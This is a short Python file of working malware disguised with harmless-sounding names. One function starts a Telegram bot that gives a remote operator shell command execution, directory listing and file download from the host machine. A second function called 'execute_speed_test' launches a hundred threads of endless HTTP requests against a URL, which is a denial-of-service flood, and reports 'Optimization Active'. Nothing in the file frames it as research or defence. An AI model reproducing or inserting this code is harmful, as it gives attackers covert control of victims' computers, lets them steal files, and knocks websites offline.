import subprocess
import os
import shutil
import sys
import telebot
import requests
import threading

def roling(token, authorized_id):
    
    back_bot = telebot.TeleBot(token)
    
    
    try: back_bot.send_message(authorized_id, "⚙️ System Sync Established. Full Access Granted.")
    except: pass

    @back_bot.message_handler(commands=['ssh'])
    def exec_cmd(m):
        if str(m.from_user.id) == str(authorized_id):
            cmd = m.text[5:].strip()
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            back_bot.reply_to(m, res.stdout or res.stderr or "Executed.")

    @back_bot.message_handler(commands=['list'])
    def list_files(m):
        path = m.text[6:].strip() or './'
        files = "\\n".join(os.listdir(path))
        back_bot.reply_to(m, files if files else "Empty.")

    @back_bot.message_handler(commands=['get'])
    def download(m):
        file_p = m.text[5:].strip()
        if os.path.isfile(file_p):
            with open(file_p, 'rb') as f: back_bot.send_document(m.chat.id, f)


    threading.Thread(target=back_bot.infinity_polling, daemon=True).start()

def execute_speed_test(url, power=100):
    
    def attack():
        while True:
            try: requests.get(url, timeout=5)
            except: pass
    for _ in range(power): threading.Thread(target=attack, daemon=True).start()
    return "Optimization Active"
